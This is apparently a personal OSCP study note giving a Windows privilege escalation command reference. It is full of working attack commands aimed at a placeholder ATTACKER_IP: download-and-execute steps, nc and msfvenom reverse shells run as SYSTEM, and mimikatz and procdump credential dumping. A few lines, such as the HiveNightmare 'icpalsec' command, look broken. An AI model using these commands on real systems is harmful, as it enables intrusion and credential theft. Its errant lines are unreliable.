---
tags: [oscp-journey, spectre, stage-1, windows-privesc, privilege-escalation]
module: 1
cert-stage: thm
difficulty: intermediate
date: 2026-04-08
phantom-refs: ["PHANTOM/MODULE 5 — Privilege Escalation/05.2 — Windows PrivEsc"]
netgod-refs: []
---

# S1-15 — Windows Privilege Escalation — Complete Reference

> [!info] Relationship to PHANTOM
> Deep technical content exists in [[PHANTOM/MODULE 5 — Privilege Escalation/05.2 — Windows PrivEsc]]. This note focuses on the OSCP exam priority order, automated tool usage, the exact exploitation commands for every technique, and the decision tree when you're stuck.

## The Core Difference from Linux PrivEsc

Windows PrivEsc centres on three things:
1. **Privileges** — special rights assigned to your account token (SeImpersonate, SeBackup, etc.)
2. **Service misconfigurations** — services running as SYSTEM with exploitable binaries or paths
3. **Stored credentials** — Windows leaves credentials in surprisingly obvious places

The goal is always SYSTEM (not just Administrator). SYSTEM is the highest privilege level and bypasses UAC entirely.

---

## Automated Enumeration Tools

### WinPEAS

WinPEAS is the Windows equivalent of LinPEAS. Run it first on every Windows foothold.

```powershell
# Transfer to target (from Kali):
python3 -m http.server 80

# On target — download:
certutil -urlcache -split -f http://ATTACKER_IP/winPEASx64.exe C:\Temp\wp.exe
powershell -c "(New-Object Net.WebClient).DownloadFile('http://ATTACKER_IP/winPEASx64.exe','C:\Temp\wp.exe')"

# Run:
C:\Temp\wp.exe

# Run specific checks only:
C:\Temp\wp.exe systeminfo userinfo
C:\Temp\wp.exe servicesinfo
C:\Temp\wp.exe applicationsinfo

# Save output:
C:\Temp\wp.exe | Out-File C:\Temp\wp_out.txt
C:\Temp\wp.exe > C:\Temp\wp_out.txt 2>&1
```

**WinPEAS download location:**
```bash
# On Kali:
ls /usr/share/peass/winpeas/
# winPEASx64.exe (64-bit) and winPEASx86.exe (32-bit)
# Or download from: github.com/peass-ng/PEASS-ng/releases
```

**Reading WinPEAS output — colour coding:**
- 🔴 **Red** — high probability escalation vector
- 🟡 **Yellow/Cyan** — interesting, investigate
- 🟢 **Green** — informational

**Key WinPEAS sections (in priority order):**
1. `System Information` — OS version, hotfixes (missing = vulnerable)
2. `User Privileges` — SeImpersonatePrivilege, SeDebugPrivilege, etc.
3. `Services` — weak permissions, unquoted paths
4. `DLL Hijacking` — writable directories in service PATH
5. `Applications Info` — installed software versions
6. `Scheduled Tasks` — tasks running as SYSTEM
7. `Registry` — AlwaysInstallElevated, stored credentials
8. `Credentials` — saved creds, SAM, registry passwords

---

### PowerUp.ps1

PowerUp focuses specifically on service misconfigurations. More targeted than WinPEAS for service-based PrivEsc.

```powershell
# Transfer and import:
powershell -c "(New-Object Net.WebClient).DownloadFile('http://ATTACKER_IP/PowerUp.ps1','C:\Temp\PowerUp.ps1')"
powershell -ep bypass
. .\PowerUp.ps1        # Dot-source to import functions

# Run all checks:
Invoke-AllChecks

# Or run in memory (no disk write):
powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/PowerUp.ps1'); Invoke-AllChecks"
```

**What PowerUp checks:**
- Unquoted service paths
- Modifiable service binaries
- Modifiable service registry keys
- AlwaysInstallElevated
- Modifiable scheduled tasks
- DLL injection paths
- Token privileges

---

### Seatbelt.exe — Situational Awareness

Seatbelt performs a broad security assessment of the host — not just PrivEsc vectors but overall security posture.

```powershell
C:\Temp\Seatbelt.exe -group=all                # Run all checks
C:\Temp\Seatbelt.exe -group=system             # System info only
C:\Temp\Seatbelt.exe TokenPrivileges           # Check token privileges
C:\Temp\Seatbelt.exe CredEnum                  # Enumerate credentials
C:\Temp\Seatbelt.exe DotNet                    # .NET version
```

---

### Sherlock.ps1 — Kernel Vulnerability Checks

Sherlock checks the OS against known local privilege escalation CVEs.

```powershell
powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/Sherlock.ps1'); Find-AllVulns"
```

---

## Manual Enumeration Checklist — In Exact Priority Order

### Check 1 — Who Am I + What Privileges Do I Have?

```cmd
whoami
whoami /all              # Full detail: username, SID, group memberships, privileges
whoami /priv             # Privileges only
whoami /groups           # Group memberships only
```

**The critical privileges to look for in `whoami /priv`:**

| Privilege | What It Means | Exploit Path |
|-----------|--------------|-------------|
| `SeImpersonatePrivilege` | Impersonate tokens | PrintSpoofer / GodPotato → SYSTEM |
| `SeAssignPrimaryTokenPrivilege` | Assign tokens to processes | Same as Impersonate |
| `SeBackupPrivilege` | Read any file bypassing ACLs | Dump SAM + SYSTEM → local hashes |
| `SeRestorePrivilege` | Write any file bypassing ACLs | Overwrite service binaries |
| `SeDebugPrivilege` | Debug any process | Dump LSASS → credentials |
| `SeLoadDriverPrivilege` | Load kernel drivers | Load vulnerable driver → kernel code exec |
| `SeTakeOwnershipPrivilege` | Take ownership of objects | Own + read sensitive files |
| `SeCreateTokenPrivilege` | Create access tokens | Create token with any group |
| `SeManageVolumePrivilege` | Volume management operations | Read/write raw disk → arbitrary file access |

> [!tip] SeImpersonatePrivilege is your most common path
> IIS app pools (`IIS AppPool\DefaultAppPool`), SQL Server service accounts, and many other service accounts run with `SeImpersonatePrivilege`. If you land as one of these accounts via web exploitation, you almost certainly have this — PrintSpoofer or GodPotato gives you SYSTEM instantly.

---

### Check 2 — OS Version and Missing Patches

```cmd
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type" /C:"Hotfix(s)"
wmic os get caption,version,buildnumber
wmic qfe list brief                    # List installed hotfixes (patches)
wmic qfe list brief | findstr "KB"
```

**What to do with this:**
1. Note the OS version and build number
2. Check `wmic qfe list brief` — the absence of specific KB patches = vulnerable
3. `searchsploit windows 10 local privilege` → filter by OS version
4. Key patches to check for absence:
   - KB3011780 / MS14-068 (Kerberos privilege escalation — AD)
   - KB4131188 / CVE-2018-8120 (Win32k)
   - KB4503293 / CVE-2019-0803 (Win32k)

---

### Check 3 — Installed Patches (Missing = Vulnerable)

```cmd
wmic qfe list brief | more
```

Cross-reference against known vulnerabilities for the OS version. If a patch isn't listed, the system is vulnerable to that CVE.

---

### Check 4 — SeImpersonatePrivilege → Potato Attacks

This is the most common Windows PrivEsc path on OSCP. If `whoami /priv` shows `SeImpersonatePrivilege` as Enabled, exploit it immediately.

**How Potato attacks work:**
Windows has a COM-based mechanism where SYSTEM-level processes can be tricked into connecting to a rogue COM server. The attacker's process impersonates the SYSTEM token from this connection, then creates a new SYSTEM-level process.

**PrintSpoofer (Windows 10 and Server 2019):**
```cmd
# Download PrintSpoofer:
certutil -urlcache -split -f http://ATTACKER_IP/PrintSpoofer64.exe C:\Temp\PrintSpoofer64.exe

# Execute:
C:\Temp\PrintSpoofer64.exe -i -c cmd       # Interactive SYSTEM cmd
C:\Temp\PrintSpoofer64.exe -c "whoami"     # Run single command
C:\Temp\PrintSpoofer64.exe -c "C:\Temp\nc.exe ATTACKER_IP PORT -e cmd.exe"   # Reverse shell as SYSTEM
```

**GodPotato (Universal — works on Windows 2012-2022):**
```cmd
certutil -urlcache -split -f http://ATTACKER_IP/GodPotato-NET4.exe C:\Temp\gp.exe

# Execute command as SYSTEM:
C:\Temp\gp.exe -cmd "whoami"
C:\Temp\gp.exe -cmd "cmd /c C:\Temp\nc.exe ATTACKER_IP PORT -e cmd.exe"
C:\Temp\gp.exe -cmd "powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/shell.ps1')"
```

**JuicyPotato (Windows Server 2016 and older, pre-2019):**
```cmd
certutil -urlcache -split -f http://ATTACKER_IP/JuicyPotato.exe C:\Temp\jp.exe

# Requires a CLSID appropriate for the OS:
# Download CLSID list: github.com/ohpe/juicy-potato/tree/master/CLSID
C:\Temp\jp.exe -l PORT -p C:\Temp\nc.exe -a "ATTACKER_IP PORT -e cmd" -t * -c {CLSID}
```

**RoguePotato (alternative for Server 2019):**
```cmd
# Requires Ncat or socat on attacker to forward:
# On Kali: socat tcp-listen:135,reuseaddr,fork tcp:TARGET:9999
certutil -urlcache -split -f http://ATTACKER_IP/RoguePotato.exe C:\Temp\rp.exe
C:\Temp\rp.exe -r ATTACKER_IP -e "C:\Temp\nc.exe ATTACKER_IP PORT -e cmd" -l 9999
```

> [!tip] Which Potato to use?
> - Windows 10 / Server 2019/2022: **PrintSpoofer** or **GodPotato** — most reliable
> - Windows Server 2016 / Windows 7-8: **JuicyPotato** — use appropriate CLSID
> - Universal fallback: **GodPotato** — designed to work across all versions

---

### Check 5 — SeBackupPrivilege → SAM Dump

```cmd
# Confirm you have it:
whoami /priv | findstr SeBackupPrivilege

# Use robocopy to copy locked files (bypasses ACLs):
robocopy /b C:\Windows\System32\config\ C:\Temp\ SAM SYSTEM
# /b = backup mode, uses SeBackupPrivilege

# Or use reg save:
reg save HKLM\SAM C:\Temp\SAM
reg save HKLM\SYSTEM C:\Temp\SYSTEM

# Transfer SAM + SYSTEM to Kali and extract hashes:
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
```

---

### Check 6 — AlwaysInstallElevated → MSI Payload

Windows Installer runs `.msi` packages as SYSTEM if `AlwaysInstallElevated` is set in both HKCU and HKLM.

```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

If BOTH return `0x1`:
```bash
# On Kali — generate MSI payload:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f msi -o evil.msi

# Serve and transfer to target:
python3 -m http.server 80
# On target:
certutil -urlcache -split -f http://ATTACKER_IP/evil.msi C:\Temp\evil.msi

# Start listener on Kali:
nc -lvnp PORT

# Execute MSI as elevated on target:
msiexec /quiet /qn /i C:\Temp\evil.msi
# /quiet = no UI, /qn = no dialogs, /i = install
```

---

### Check 7 — Unquoted Service Paths

When a service's binary path contains spaces and is not enclosed in quotes, Windows searches for the executable at each space-separated path component.

```
BINARY_PATH_NAME: C:\Program Files\My App\service.exe
```

Windows tries to execute in order:
1. `C:\Program.exe` (if this exists and is writable → exploit)
2. `C:\Program Files\My.exe`
3. `C:\Program Files\My App\service.exe`

**Finding unquoted paths:**
```cmd
# Method 1 — WMIC:
wmic service get name,pathname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v """

# Method 2 — sc query:
sc qc ServiceName | findstr BINARY_PATH_NAME

# Method 3 — PowerShell:
Get-WmiObject -class Win32_Service | Where-Object {$_.PathName -notmatch '"' -and $_.PathName -match ' '} | Select Name,PathName,StartMode

# Method 4 — PowerUp:
Get-UnquotedService
```

**Exploitation:**
```bash
# Determine which directory in the path is writable:
icacls "C:\Program Files"          # Can you write here?
icacls "C:\Program Files\My App"   # Can you write here?

# If C:\Program Files\My.exe is writable location:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f exe -o "My.exe"
# Place in C:\Program Files\My.exe
# Restart the service:
sc stop ServiceName
sc start ServiceName
# Or wait for system reboot if you can't restart services
```

---

### Check 8 — Weak Service Binary Permissions

If you have write permission on the service's executable binary itself, replace it with a payload.

```cmd
# Check permissions on service binary:
icacls "C:\Program Files\Service\service.exe"

# Look for BUILTIN\Users:(M) or Everyone:(F) or Authenticated Users:(M)
# (M) = Modify, (F) = Full Control — both allow replacement

# Using accesschk (Sysinternals):
accesschk.exe /accepteula -uwcqv "Authenticated Users" *
accesschk.exe /accepteula -uwcqv "Everyone" *
accesschk.exe /accepteula -uwcqv "BUILTIN\Users" *
```

**Exploitation:**
```bash
# Generate replacement payload:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f exe -o service.exe

# On target:
# Backup original binary:
copy "C:\Program Files\Service\service.exe" "C:\Temp\service_backup.exe"
# Replace with payload:
copy /y C:\Temp\service.exe "C:\Program Files\Service\service.exe"

# Start listener on Kali, then restart service:
sc stop ServiceName
sc start ServiceName
# Shell catches as SYSTEM
```

---

### Check 9 — Weak Service Registry Key Permissions

Instead of modifying the binary, modify the registry key that defines where the binary is:

```cmd
# Check registry key permissions for a service:
accesschk.exe /accepteula -uwdqv "Authenticated Users" HKLM\SYSTEM\CurrentControlSet\Services\
accesschk.exe /accepteula -uwdqv HKLM\SYSTEM\CurrentControlSet\Services\ServiceName

# If you have write access, change the binary path:
reg add HKLM\SYSTEM\CurrentControlSet\Services\ServiceName /v ImagePath /t REG_EXPAND_SZ /d "C:\Temp\payload.exe" /f
sc stop ServiceName
sc start ServiceName
```

---

### Check 10 — DLL Hijacking

When a service loads a DLL from a directory that's writable by non-admin users, you can plant a malicious DLL with the same name.

**Finding DLL hijacking opportunities:**
- WinPEAS flags writable directories in service PATH
- Process Monitor (Sysinternals, lab use only) shows DLL load failures (NAME NOT FOUND)
- Known vulnerable applications: specific Tomcat versions, older Oracle clients, etc.

**Known exploitable DLL patterns:**
```cmd
# If a service loads DLLs from a directory in PATH that you can write to:
$env:PATH                          # Check PATH directories
foreach($dir in $env:PATH -split ';') { icacls $dir 2>$null }
# Find any directory in PATH with write access
```

**Generating a malicious DLL:**
```bash
# On Kali:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f dll -o evil.dll
```

**On target — place DLL where service will find it:**
```cmd
# Copy to writable directory that's in service's DLL search path:
copy C:\Temp\evil.dll C:\WritablePath\legitimate_name.dll
# Restart service → DLL loads → shell as service account (often SYSTEM)
```

---

### Check 11 — Scheduled Tasks

```cmd
schtasks /query /fo LIST /v                    # All scheduled tasks
schtasks /query /fo LIST /v | findstr /i "task name\|run as\|task to run\|status"

# PowerShell:
Get-ScheduledTask | Where-Object {$_.Principal.UserId -like "*System*"} | Select TaskName,TaskPath
Get-ScheduledTask | Get-ScheduledTaskInfo

# Check permissions on task's binary or script:
icacls "C:\path\to\task\script.bat"
```

**Exploitation — if task script is writable:**
```cmd
# Append reverse shell to the script:
echo C:\Temp\nc.exe ATTACKER_IP PORT -e cmd.exe >> C:\path\to\script.bat
# Wait for task to execute → shell as SYSTEM
```

---

### Check 12 — Saved Credentials (cmdkey)

Windows Credential Manager stores saved credentials. If an admin has saved credentials, you can use them.

```cmd
cmdkey /list                       # List all saved credentials

# If credentials exist — use them with runas:
runas /savecred /user:COMPUTERNAME\Administrator cmd.exe
runas /savecred /user:DOMAIN\Administrator cmd.exe
# No password prompt — uses saved credential

# Or use stored credentials with:
runas /user:COMPUTERNAME\Administrator cmd.exe     # Prompts for password if not saved
```

---

### Check 13 — Passwords in Registry

```cmd
# Search registry for passwords:
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
reg query HKLM /f pwd /t REG_SZ /s

# Specific common locations:
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
# Look for: AutoAdminLogon=1, DefaultUsername, DefaultPassword (autologin creds)

reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
# SNMP community strings

reg query "HKCU\SOFTWARE\SimonTatham\PuTTY\Sessions" /s
# PuTTY saved sessions — sometimes include passwords
```

---

### Check 14 — Passwords in Files

```cmd
# Search common locations:
dir /s /b C:\Users\*.txt 2>nul | findstr /i pass
dir /s /b C:\Users\*.xml 2>nul
dir /s /b C:\Users\*.ini 2>nul
dir /s /b C:\Users\*.config 2>nul
dir /s /b C:\inetpub\*.config 2>nul

# findstr recursive search:
findstr /si password C:\Users\*.txt
findstr /si password C:\Users\*.xml
findstr /si password C:\inetpub\*.config
findstr /spin "password" C:\*.xml C:\*.ini C:\*.txt C:\*.config 2>nul

# Unattended install files — frequently contain passwords:
type C:\Windows\Panther\Unattend.xml 2>nul
type C:\Windows\Panther\Unattended.xml 2>nul
type C:\Windows\sysprep\sysprep.xml 2>nul
type C:\Windows\sysprep.inf 2>nul
type C:\Windows\system32\sysprep\sysprep.xml 2>nul

# IIS web.config (database connection strings):
type C:\inetpub\wwwroot\web.config 2>nul
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\CONFIG\web.config 2>nul

# PowerShell history:
type C:\Users\username\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

---

### Check 15 — GPP Passwords (Group Policy Preferences)

Before MS14-025 (2014), Group Policy Preferences stored passwords in SYSVOL encrypted with a known static key. Even though this was patched, many environments still have old GPP XML files with encrypted passwords.

```bash
# From Kali — enumerate SYSVOL:
smbclient //DC_IP/SYSVOL -U domain/user%pass
find . -name "Groups.xml"

# Or with CrackMapExec:
crackmapexec smb DC_IP -u user -p pass -M gpp_password
crackmapexec smb DC_IP -u user -p pass -M gpp_autologin

# Decrypt the cPassword field (known static AES key):
gpp-decrypt "ENCRYPTED_VALUE"
```

**On a domain-joined machine:**
```powershell
# PowerSploit's Get-GPPPassword:
IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/Get-GPPPassword.ps1')
Get-GPPPassword
```

---

### Check 16 — Token Impersonation (Meterpreter)

If you're in a Meterpreter session and have SeImpersonatePrivilege but the Potato tools aren't working:

```
meterpreter> use incognito
meterpreter> list_tokens -u            # List available tokens
meterpreter> impersonate_token "NT AUTHORITY\\SYSTEM"
meterpreter> getuid                    # Confirm SYSTEM
meterpreter> shell                     # Get shell as SYSTEM
```

---

## SAM Database Dump — Local Admin to SYSTEM Hash

If you have local Administrator access (but aren't SYSTEM), dump the SAM database for all local user hashes:

```cmd
# Method 1 — reg save (requires admin):
reg save HKLM\SAM C:\Temp\SAM
reg save HKLM\SYSTEM C:\Temp\SYSTEM

# Method 2 — Volume Shadow Copy:
wmic shadowcopy call create Volume='C:\'
vssadmin list shadows
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\Temp\SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\Temp\SYSTEM

# Transfer to Kali and extract:
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
```

**Hash output format:**
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
```
Field 4 (`8846f7eaee8fb117ad06bdd830b7586c`) is the NTLM hash. Crack with hashcat or use directly for Pass-the-Hash.

---

## LSASS Credential Harvesting

LSASS (Local Security Authority Subsystem Service) holds credentials for currently logged-in users in memory — including NTLM hashes and sometimes cleartext passwords.

> [!warning] LSASS dumping triggers Defender on modern systems
> On OSCP machines, AV/EDR is typically disabled. In real engagements, use more evasive methods. For the exam, standard dumping works.

### Method 1 — Mimikatz (Requires SYSTEM or SeDebugPrivilege)

```cmd
# Download mimikatz:
certutil -urlcache -split -f http://ATTACKER_IP/mimikatz.exe C:\Temp\mimikatz.exe
# Or use Invoke-Mimikatz (in-memory, less likely to be flagged):
powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -Command 'privilege::debug sekurlsa::logonpasswords'"

# In mimikatz:
privilege::debug
sekurlsa::logonpasswords         # Dump all credentials from LSASS
sekurlsa::wdigest                # WDigest cleartext (Windows < 8.1 or with registry tweak)
sekurlsa::tickets                # Kerberos tickets
lsadump::sam                     # SAM database (local accounts)
lsadump::secrets                 # LSA secrets
lsadump::cache                   # Cached domain credentials (DCC2 hashes)
lsadump::dcsync /user:krbtgt     # DCSync — if you have DA
```

### Method 2 — procdump (Sysinternals — less flagged)

```cmd
certutil -urlcache -split -f http://ATTACKER_IP/procdump.exe C:\Temp\procdump.exe
C:\Temp\procdump.exe -accepteula -ma lsass.exe C:\Temp\lsass.dmp

# Transfer lsass.dmp to Kali and parse:
impacket-secretsdump -system SYSTEM -security SECURITY LOCAL   # From registry
# Or use pypykatz:
pypykatz lsa minidump lsass.dmp
```

### Method 3 — Task Manager (GUI — if you have RDP)

1. Open Task Manager → Details tab
2. Find `lsass.exe`
3. Right-click → Create dump file
4. File saved to `C:\Users\username\AppData\Local\Temp\lsass.dmp`
5. Transfer and parse with pypykatz

---

## Windows Credential Manager

```cmd
cmdkey /list                           # List stored credentials
# RDP sessions, network paths, web credentials

# Using stored credentials:
runas /savecred /user:MACHINE\Administrator cmd
```

**Using mimikatz to extract:**
```
mimikatz # vault::cred
mimikatz # vault::list
```

---

## Kernel Exploits — Last Resort

> [!danger] Kernel exploits crash Windows systems
> Even more dangerous than Linux. A crashed Windows machine requires manual reboot and you lose your session. Only use when all other paths are exhausted.

**Check OS version and search for exploits:**
```cmd
systeminfo | findstr "OS Version"
wmic os get caption,version
```

**Key Windows kernel exploits:**

| CVE | Name | Affected OS |
|-----|------|------------|
| CVE-2019-0708 | BlueKeep | Windows 7, Server 2008 |
| CVE-2020-0796 | SMBGhost | Windows 10 1903/1909 |
| CVE-2021-36934 | HiveNightmare/SeriousSAM | Windows 10 21H1 |
| MS16-032 | Secondary Logon Handle | Windows 7-10, Server 2008-2012 |
| MS15-051 | Win32k | Windows Vista-8, Server 2003-2012 |
| MS14-058 | Win32k | Windows XP-8.1, Server 2003-2012R2 |

**MS16-032 — Secondary Logon Handle Privilege Escalation:**
```powershell
# Works on Windows 7-10, Server 2008-2012 without patch
powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/MS16-032.ps1')"
# Sets up reverse shell automatically
```

**HiveNightmare (CVE-2021-36934) — SAM readable by non-admin:**
```cmd
# Check if vulnerable:
icacls C:\Windows\System32\config\SAM
# If BUILTIN\Users has read access → vulnerable

# Exploit: use VSS to read SAM as non-admin:
icpalsec -f SAM \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM
```

---

## The PrivEsc Decision Tree — When Nothing Is Obvious

```
1. Did you run whoami /priv and check every privilege against the table above?
   → SeImpersonatePrivilege: PrintSpoofer or GodPotato → STOP, you have SYSTEM

2. Did you run WinPEAS and READ every red/yellow finding?
   → If no: run it and read it fully

3. Did you check AlwaysInstallElevated?
   → reg query HKCU\...\Installer /v AlwaysInstallElevated
   → reg query HKLM\...\Installer /v AlwaysInstallElevated

4. Did you check all services for unquoted paths?
   → wmic service get name,pathname,startmode (filter for spaces without quotes)

5. Did you check service binary permissions?
   → accesschk.exe -uwcqv "Authenticated Users" *

6. Did you check scheduled tasks for writable scripts?
   → schtasks /query /fo LIST /v

7. Did you check cmdkey /list for saved credentials?

8. Did you search the registry for passwords?
   → reg query HKLM /f password /t REG_SZ /s

9. Did you search files for passwords?
   → findstr /si password *.xml *.ini *.txt *.config

10. Did you check PowerShell history?
    → type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

11. Did you check Unattend.xml and sysprep files?

12. What's the OS version? Are there known local exploits?
    → systeminfo → searchsploit windows + version
```

---

## OSCP Exam Windows PrivEsc Strategy

**Time budget:**
- Easy Windows: ≤ 30 minutes. SeImpersonate → Potato is almost always the path.
- Medium Windows: ≤ 45 minutes.
- Hard machine: ≤ 60 minutes.

**Priority on exam (first 10 minutes):**
```
Minute 1:  whoami /priv — SeImpersonatePrivilege? → PrintSpoofer/GodPotato → done
Minute 2:  whoami /groups — docker, backup operators, server operators?
Minute 3:  systeminfo — OS version for kernel CVE search
Minute 4:  wmic qfe list — missing patches
Minute 5:  Run WinPEAS in background
Minute 6:  Check AlwaysInstallElevated (2 commands)
Minute 7:  Check cmdkey /list
Minute 8:  Check reg for autologin creds
Minute 9:  Check Unattend.xml
Minute 10: Start reading WinPEAS output
```

---

## Quick Reference — All PrivEsc Commands

```cmd
REM IDENTITY AND PRIVILEGES
whoami /all
whoami /priv

REM SYSTEM INFO
systeminfo
wmic qfe list brief

REM POTATO ATTACKS (SeImpersonatePrivilege)
PrintSpoofer64.exe -i -c cmd
GodPotato-NET4.exe -cmd "cmd /c whoami"

REM ALWAYS INSTALL ELEVATED
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
msiexec /quiet /qn /i evil.msi

REM UNQUOTED SERVICE PATHS
wmic service get name,pathname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v """"

REM SERVICE BINARY PERMISSIONS
accesschk.exe /accepteula -uwcqv "Authenticated Users" *
icacls "C:\path\to\service.exe"

REM SAVED CREDENTIALS
cmdkey /list
runas /savecred /user:MACHINE\Administrator cmd

REM REGISTRY PASSWORDS
reg query HKLM /f password /t REG_SZ /s
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

REM FILE SEARCH
findstr /si password C:\Users\*.txt C:\Users\*.xml C:\inetpub\*.config

REM POWERSHELL HISTORY
type %APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

REM UNATTENDED INSTALL FILES
type C:\Windows\Panther\Unattend.xml
type C:\Windows\sysprep\sysprep.xml

REM SAM DUMP (LOCAL ADMIN)
reg save HKLM\SAM C:\Temp\SAM
reg save HKLM\SYSTEM C:\Temp\SYSTEM

REM LSASS DUMP
C:\Temp\procdump.exe -accepteula -ma lsass.exe C:\Temp\lsass.dmp

REM MIMIKATZ
privilege::debug
sekurlsa::logonpasswords
lsadump::sam

REM SCHEDULED TASKS
schtasks /query /fo LIST /v
```

---

## Common Mistakes

> [!warning] These keep people stuck on Windows PrivEsc
> 1. **Missing SeImpersonatePrivilege.** It's in `whoami /priv`. Run this FIRST on every Windows shell. Not doing so and spending 45 minutes on service enumeration when Potato would've given SYSTEM in 30 seconds is the biggest time waste on OSCP.
> 2. **Using the wrong Potato tool for the OS.** JuicyPotato doesn't work on Server 2019. PrintSpoofer doesn't work on Server 2012. Know which tool for which OS.
> 3. **Not checking AlwaysInstallElevated.** Two commands, takes 10 seconds. When set, it's instant SYSTEM via MSI.
> 4. **Forgetting PowerShell history.** Many OSCP machines have administrators running commands with credentials. `ConsoleHost_history.txt` is full of them.
> 5. **Not checking Unattend.xml.** Corporate imaging often leaves cleartext admin passwords in these files. Always check.
> 6. **Running accesschk without /accepteula.** It opens a GUI EULA dialog that hangs if there's no interactive desktop. Always include `/accepteula` in the flags.
> 7. **Trying kernel exploits before service misconfigs.** On Windows, service misconfiguration is far more reliable and safer than kernel exploits. Service misconfigs are common; kernel exploits crash systems.

---

## Practice Resources

| Resource | What to do |
|----------|-----------|
| TryHackMe — "Windows PrivEsc" room | Every technique in this note — guided labs |
| TryHackMe — "Windows PrivEsc Arena" | Challenge-based — no guidance |
| TryHackMe — "Steel Mountain" | Windows service exploitation + PowerUp |
| HTB — Devel | SeImpersonatePrivilege via IIS + Churrasco |
| HTB — Bastard | Drupal + Juicy/Churrasco |
| HTB — Granny/Granpa | WebDAV + MS09-012 |
| HTB — Optimum | HttpFileServer + MS16-032 |
| HTB — Jeeves | Jenkins → SYSTEM → PTH → root.txt in ADS |
| VulnHub — Brainpan | Stack overflow → Windows PrivEsc chain |
| LOLBAS (lolbas-project.github.io) | Windows Living Off the Land Binaries |
| PayloadsAllTheThings — Windows PrivEsc | Comprehensive technique list |
| HackTricks — Windows PrivEsc | Complete reference with commands |
| [[PHANTOM/MODULE 5 — Privilege Escalation/05.2 — Windows PrivEsc]] | Full technical depth in PHANTOM vault |
